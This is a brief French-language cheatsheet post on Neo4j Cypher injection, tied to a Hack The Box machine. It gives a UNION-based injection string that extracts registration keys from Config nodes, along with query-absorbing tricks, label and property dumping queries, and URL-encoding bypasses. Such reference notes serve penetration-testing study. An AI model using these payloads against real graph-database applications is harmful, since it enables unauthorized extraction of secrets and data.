---
title: "Neo4j Cypher Injection"
date: 2026-03-27
draft: false
author: "keyll0ger"
description: "Similaire à SQL injection mais pour Neo4j (base de données graphe). Le langage de requête est Cypher. Si la requête originale est:"
summary: "WebAttacks | Neo4j Cypher Injection"
tags:
  - "Web"
  - "OWASP"
  - "Cheatsheet"
categories:
  - "Cheatsheet"
  - "WebAttacks"
ShowToc: true
TocOpen: false
---

## Concept
Similaire à SQL injection mais pour Neo4j (base de données graphe).
Le langage de requête est Cypher.

## Détection
- Erreurs Neo4j dans les réponses
- Paramètres utilisés dans des URLs/APIs qui interrogent une DB graphe

## Payloads

### UNION-based extraction
Si la requête originale est:
```cypher
MATCH (p:Product {id: "<INPUT>"}) RETURN p as result
```

Injection:
```
x"}) RETURN result UNION ALL MATCH (c:Config) RETURN {id: c.registration_key, name: c.registration_key} as result UNION ALL MATCH (result:ZZZZZ {a: "
```

**Important:** Le résultat UNION doit avoir la même structure que la requête originale.

### Commentaires
- `//` ne fonctionne pas dans les URLs (interprété comme path)
- Utiliser UNION ALL avec un MATCH impossible pour absorber le code restant:
  `UNION ALL MATCH (result:ZZZZZ {a: "...`

### Lister les labels (types de nœuds)
```cypher
CALL db.labels() YIELD label RETURN label
```

### Extraire toutes les propriétés
```cypher
MATCH (n:User) RETURN properties(n)
```

## Bypass
- URL-encoder les espaces: `%20` ou `\u0020` (dans Next.js)
- Les guillemets: `%22`

## Ref
- Machine: Sorcery (HTB Insane) - Rust backend avec format!() non sanitisé
